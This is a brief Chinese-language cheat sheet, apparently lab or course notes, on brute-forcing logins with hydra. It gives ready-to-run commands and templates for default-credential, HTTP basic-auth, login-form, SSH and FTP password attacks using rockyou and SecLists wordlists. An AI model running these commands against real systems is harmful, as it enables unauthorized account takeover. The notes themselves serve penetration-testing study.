
## 默认密码攻击

下面这个仓库有一些默认密码
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials

使用hydra进行默认密码爆破
sudo hydra -C ftp-pass.txt 94.237.54.75 -s 43247 http-get / 

-C ftp-betterdefaultpasslist.txt	组合凭证词汇表
SERVER_IP	                        目标IP
-s PORT	                            目标端口
http-get	                        请求方式
/	                                目标路径

## 用户名暴力破解
得到用户或密码时可以通过hydra来爆破
hydra -l admin -P rockyou.txt  -u -f 94.237.49.138 -s 43678 http-get /

## 登录界面表单爆破

hydra -l admin -P /usr/share/wordlists/rockyou.txt  94.237.63.93  -s 37751 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'" 



命令	                         描述
hydra -h	                    九头蛇帮助
hydra -C wordlist.txt SERVER_IP -s PORT http-get /	                        基本验证暴力破解 - 组合词表
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /	基本身份验证暴力破解 - 用户/密码单词列表
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"	登录表单暴力破解 - 静态用户，密码单词列表
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4	        SSH 暴力破解 - 用户/密码单词列表
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1	                        FTP 暴力破解 - 静态用户、密码字典